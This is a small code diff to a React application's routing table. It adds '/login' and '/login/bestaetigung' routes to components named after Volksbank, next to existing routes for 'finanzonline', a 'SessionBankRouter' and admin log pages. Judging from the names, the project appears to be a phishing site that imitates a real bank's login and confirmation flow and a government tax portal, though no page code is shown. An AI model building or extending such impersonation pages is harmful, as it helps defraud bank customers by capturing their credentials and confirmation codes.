@@ -126,6 +126,8 @@ const App = () => (
           <Routes>
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
+            <Route path="/login" element={<P><VolksbankLogin /></P>} />
+            <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
             <Route path="/admin" element={<Admin />} />
             <Route path="/admin/logs" element={<AdminLogs />} />
